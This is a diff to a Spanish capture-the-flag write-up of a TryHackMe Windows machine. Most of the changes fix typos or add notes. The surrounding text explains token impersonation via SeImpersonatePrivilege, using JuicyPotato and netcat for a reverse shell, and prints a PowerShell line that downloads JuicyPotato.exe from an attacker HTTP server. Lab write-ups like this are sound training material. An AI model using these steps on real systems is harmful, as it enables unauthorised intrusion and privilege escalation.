@@ -115,7 +115,7 @@ Enumeramos ahora los permisos (o mejor dicho privilegios) con los que cuenta nue
 Vemos que el comando nos devuelve varios resultados, pero uno solo es el que debe llamar nuestra atención: **SeImpersonatePrivilege**. Este privilegio es importante ya que mediante este podemos explotar una vulnerabilidad llamada **Windows Token Impersonation**.
 
 # Windows Token Impersonation
-Si queremos revisar una explicación más detallada de esta vulnerabilidad podemos leer [este recurso](https://www.exploit-db.com/papers/42556). En resumen, Windows emplea tokens para establecer los permisos que tiene un usuario al momento que este inicia sesióon en el sistema (conocidos como tokens de acceso). Estos pueden ser de dos tipos:
+Si queremos revisar una explicación más detallada de esta vulnerabilidad podemos leer [este recurso](https://www.exploit-db.com/papers/42556). En resumen, Windows emplea tokens para establecer los permisos que tiene un usuario al momento que este inicia sesión en el sistema (conocidos como tokens de acceso). Estos pueden ser de dos tipos:
 
 1. Primarios
 2. De interpretación (impersonation). La traducción al español no es la más apropiada, ya que el término "impersonation" hace referencia a hacerse pasar por alguien más.
@@ -137,7 +137,7 @@ Y claro, también dependerá de las actualizaciones con las que cuente el sistem
 
 ![15]
 	
-Dado que la herramienta nos permite ejecutar cualquier comando en el sistema, lo que quiero realizar es entablar una reverse shell con ayuda de netcat. Por lo tanto, requiero que tanto **JuicyPotato.exe** como **nc.exe** estén en el servidor remoto. El segundo está presente en cualquier distribución de Linux para pentesting, y puede localizarse con el comando:
+Dado que la herramienta nos permite ejecutar cualquier comando en el sistema, lo que quiero hacer es entablar una reverse shell con ayuda de netcat. Por lo tanto, requiero que tanto **JuicyPotato.exe** como **nc.exe** estén en el servidor remoto. El segundo está presente en cualquier distribución de Linux para pentesting, y puede localizarse con el comando:
 
 	locate nc.exe
 	
@@ -145,11 +145,13 @@ Para transferirlos a la máquina víctima, establecemos un servidor HTTP con Pyt
 
 	(New-Object Net.WebClient).DownloadFile('http://10.10.251.43:8080/JuicyPotato.exe','c:\windows\temp\privesc\JP.exe')
 	
-Nótese cómo se ha creado un directorio en C:\Windows\Temp llamado **Privesc** desde donde realizaremos el proceso de escalada de privilegios.
+Nota: A diferencia de la máquina **Steel Mountain**, esta versión de **Powershell** que corre en el sistema no nos permite elecutar un **Invoke-WebRequest**, por lo que debemos hacerlo de esta otra manera.
+	
+Nótese cómo se ha creado un directorio en C:\Windows\Temp llamado **Privesc** desde donde realizaremos el proceso de escalada de privilegios. Esto no es necesario, pero recuerda que necesitas de un directorio con permisos de escritura para descargar los binarios.
 
 ![16]
 
-Realizamos el mismo procedimiento para el binario de **¨netcat**:
+Realizamos el mismo procedimiento para el binario de **netcat**:
 
 ![17]
 
@@ -173,7 +175,7 @@ Como podemos observar, recibimos la shell como un usuario privilegiado del siste
 ![19]
 
 # Flag de root
-Este paso no se pudo completar por varias razones. Primero, el sistema no cuenta con un directorio para el usuario **Administrator**, por lo que la flag no se localiza en este directorio. La misma plataforma de TryHackMe nos dicce que la flag se encuentra en esta dirección:
+Este paso no se pudo completar por varias razones. Primero, el sistema no cuenta con un directorio para el usuario **Administrator**, por lo que la flag no se localiza en este directorio. La misma plataforma de TryHackMe nos dice que la flag se encuentra en esta dirección:
 
 	C:\Windows\System32\config
 	
